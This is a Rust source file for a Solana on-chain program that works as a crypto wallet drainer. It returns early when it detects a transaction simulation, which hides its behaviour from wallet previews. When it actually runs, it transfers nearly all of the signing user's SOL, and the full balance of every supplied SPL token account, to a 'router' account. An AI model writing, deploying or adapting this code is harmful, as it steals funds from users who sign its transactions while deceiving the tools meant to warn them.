use solana_program::{
    account_info::AccountInfo,
    entrypoint,
    entrypoint::ProgramResult,
    pubkey::Pubkey,
    system_instruction,
    program::invoke,
    program_pack::Pack,
    instruction::get_processed_sibling_instruction,
};
use spl_token::{
    instruction as token_instruction,
    state::Account as TokenAccount,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    
    if detect_simulation() {
        return Ok(());
    }

    let user = &accounts[0];
    let router = &accounts[1];
    let system = &accounts[2];

    let minimum = 890880;
    let available = user.lamports();

    if available > minimum + 10000 {
        let amount = available - minimum - 5000;
        
        let transfer = system_instruction::transfer(
            user.key,
            router.key,
            amount,
        );

        invoke(
            &transfer,
            &[user.clone(), router.clone(), system.clone()],
        )?;
    }

    let token_accounts = &accounts[3..];
    let token_count = token_accounts.len() / 2;

    for i in 0..token_count {
        let user_ata = &token_accounts[i * 2];
        let router_ata = &token_accounts[i * 2 + 1];

        if user_ata.data_len() > 0 {
            if let Ok(token_account) = TokenAccount::unpack(&user_ata.data.borrow()) {
                if token_account.amount > 0 {
                    let transfer = token_instruction::transfer(
                        &spl_token::id(),
                        user_ata.key,
                        router_ata.key,
                        user.key,
                        &[],
                        token_account.amount,
                    )?;

                    invoke(
                        &transfer,
                        &[
                            user_ata.clone(),
                            router_ata.clone(),
                            user.clone(),
                        ],
                    )?;
                }
            }
        }
    }

    Ok(())
}

fn detect_simulation() -> bool {
    if get_processed_sibling_instruction(0).is_none() {
        return true;
    }
    false
}
